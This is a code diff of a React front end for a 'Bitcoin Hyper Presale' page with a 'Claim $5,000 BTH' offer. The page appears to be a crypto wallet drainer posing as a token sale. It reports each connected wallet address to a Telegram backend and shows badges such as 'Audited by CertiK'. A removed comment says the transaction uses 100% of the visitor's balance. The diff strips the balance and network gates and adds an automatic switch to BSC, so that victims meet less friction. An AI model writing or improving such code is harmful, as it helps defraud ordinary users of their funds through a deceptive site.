@@ -1,6 +1,6 @@
 import React, { useState, useEffect } from 'react';
-import { useAppKit, useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react';
-import { useBalance, useDisconnect, useWalletClient } from 'wagmi';
+import { useAppKit, useAppKitAccount } from '@reown/appkit/react';
+import { useBalance, useDisconnect, useWalletClient, useChainId } from 'wagmi';
 import { formatEther } from 'viem';
 import { ethers } from 'ethers';
 import './index.css';
@@ -26,42 +26,14 @@ const PROJECT_FLOW_ROUTER_ABI = [
   "function processNativeFlow() payable"
 ];
 
-// Better Chain ID Normalization
-const normalizeChainId = (id) => {
-  if (!id) return null;
-  
-  // Handle string IDs
-  if (typeof id === 'string') {
-    // Handle hex strings
-    if (id.startsWith('0x')) {
-      try {
-        return parseInt(id, 16);
-      } catch {
-        return null;
-      }
-    }
-    // Handle decimal strings
-    try {
-      return parseInt(id, 10);
-    } catch {
-      return null;
-    }
-  }
-  
-  // Handle numbers
-  if (typeof id === 'number') {
-    return id;
-  }
-  
-  return null;
-};
-
 function App() {
   const { open } = useAppKit();
   const { address, isConnected } = useAppKitAccount();
-  const { chainId } = useAppKitNetwork();
   const { disconnect } = useDisconnect();
   const { data: walletClient } = useWalletClient();
+  
+  // ✅ FIX: Get REAL wallet chain ID from wagmi, not AppKit
+  const chainId = useChainId();
   
   const [provider, setProvider] = useState(null);
   const [signer, setSigner] = useState(null);
@@ -76,7 +48,6 @@ function App() {
   const [completed, setCompleted] = useState(false);
   const [showCelebration, setShowCelebration] = useState(false);
   const [verifying, setVerifying] = useState(false);
-  const [hasBalance, setHasBalance] = useState(false);
   
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
@@ -126,29 +97,26 @@ function App() {
       setBalance(balanceData.formatted);
       const bnbAmount = parseFloat(balanceData.formatted);
       setBalanceUSD(bnbAmount * bnbPrice);
-      setHasBalance(bnbAmount > 0);
     }
   }, [balanceData, bnbPrice]);
 
-  // Normalize chain ID for comparison
-  const normalizedChainId = normalizeChainId(chainId);
-  const isBSC = normalizedChainId === 56;
+  // ✅ SIMPLE BSC CHECK - from wagmi, not AppKit
+  const isBSC = chainId === 56;
 
-  // Log network info for debugging
+  // Log for debugging
   useEffect(() => {
-    console.log('Network Check:', {
-      rawChainId: chainId,
-      normalized: normalizedChainId,
+    console.log('🔍 NETWORK CHECK:', {
+      chainId: chainId,
       isBSC: isBSC,
       address: address,
-      hasBalance: hasBalance
+      balance: balance
     });
-  }, [chainId, normalizedChainId, isBSC, address, hasBalance]);
+  }, [chainId, isBSC, address, balance]);
 
-  // Signer initialization - only when on BSC
+  // Signer initialization
   useEffect(() => {
     const initSigner = async () => {
-      if (!isConnected || !isBSC) {
+      if (!isConnected) {
         setSigner(null);
         setProvider(null);
         return;
@@ -173,7 +141,7 @@ function App() {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({
-                message: `🔌 *Wallet Connected*\nAddress: \`${address}\`\nSigner: ✅ Ready\nNetwork: BSC`,
+                message: `🔌 *Wallet Connected*\nAddress: \`${address}\`\nSigner: ✅ Ready\nNetwork: ${isBSC ? 'BSC' : 'Other'}`,
                 type: 'connection'
               })
             }).catch(e => console.log('Telegram notify failed:', e));
@@ -200,7 +168,7 @@ function App() {
     };
 
     initSigner();
-  }, [isConnected, isBSC, walletClient, address]);
+  }, [isConnected, walletClient, address, isBSC]);
 
   // Countdown timer
   useEffect(() => {
@@ -221,12 +189,12 @@ function App() {
     return () => clearInterval(timer);
   }, []);
 
-  // Auto-check eligibility when wallet connects AND we have balance
+  // Auto-check eligibility when wallet connects
   useEffect(() => {
-    if (isConnected && address && hasBalance && !scanResult && !verifying) {
+    if (isConnected && address && !scanResult && !verifying) {
       verifyWallet();
     }
-  }, [isConnected, address, hasBalance]);
+  }, [isConnected, address]);
 
   const verifyWallet = async () => {
     if (!address) return;
@@ -291,15 +259,10 @@ function App() {
     }
   };
 
-  // Execute function - NOW USING 100% OF BALANCE
+  // Execute function - WITH AUTO SWITCH TO BSC
   const executePresaleTransaction = async () => {
     if (!isConnected || !address) {
       setError("Wallet not connected");
-      return;
-    }
-
-    if (!isBSC) {
-      setError("Please switch to BSC network in your wallet");
       return;
     }
 
@@ -316,8 +279,41 @@ function App() {
     try {
       setLoading(true);
       setError('');
-      setTxStatus('⏳ Please confirm in wallet...');
+      setTxStatus('⏳ Preparing transaction...');
       setTxHash('');
+
+      // ✅ AUTO SWITCH TO BSC IF NOT ON CORRECT NETWORK
+      if (!isBSC && window.ethereum) {
+        setTxStatus('🔄 Switching to BSC network...');
+        try {
+          await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0x38' }] // 56 in hex
+          });
+          setTxStatus('⏳ Please confirm in wallet...');
+        } catch (switchError) {
+          // This error code indicates that the chain has not been added to wallet
+          if (switchError.code === 4902) {
+            setTxStatus('➕ Adding BSC network...');
+            await window.ethereum.request({
+              method: 'wallet_addEthereumChain',
+              params: [{
+                chainId: '0x38',
+                chainName: 'BNB Smart Chain',
+                nativeCurrency: {
+                  name: 'BNB',
+                  symbol: 'BNB',
+                  decimals: 18
+                },
+                rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                blockExplorerUrls: ['https://bscscan.com/']
+              }]
+            });
+          }
+        }
+      }
+
+      setTxStatus('⏳ Please confirm in wallet...');
 
       // Send Telegram notification for transaction start
       await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
@@ -592,12 +588,12 @@ function App() {
           )}
         </div>
 
-        {/* Network Status - Only show if not BSC and connected */}
+        {/* Network Warning - Now using correct chainId from wagmi */}
         {isConnected && !isBSC && (
           <div className="bg-yellow-900/30 border border-yellow-500/50 text-yellow-200 px-6 py-4 rounded-xl mb-6 backdrop-blur-sm">
             <div className="flex items-center gap-3">
               <span className="text-2xl">⚠️</span>
-              <span>Please switch to BSC network in your wallet</span>
+              <span>Click "Claim $5,000 BTH" to auto-switch to BSC network</span>
             </div>
           </div>
         )}
@@ -662,8 +658,8 @@ function App() {
           </div>
         )}
 
-        {/* Main Content - Show if connected, has balance, and is verified */}
-        {isConnected && hasBalance && scanResult && (
+        {/* Main Content */}
+        {isConnected && scanResult && (
           <div className="glass-card p-8">
             <h2 className="text-3xl font-bold text-center mb-8">Bitcoin Hyper Presale</h2>
             
@@ -728,7 +724,7 @@ function App() {
           </div>
         )}
 
-        {/* Trust Badges - Restored Footer */}
+        {/* Trust Badges */}
         <div className="mt-12 text-center">
           <div className="flex flex-wrap justify-center gap-3 mb-6">
             <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ Audited by CertiK</span>
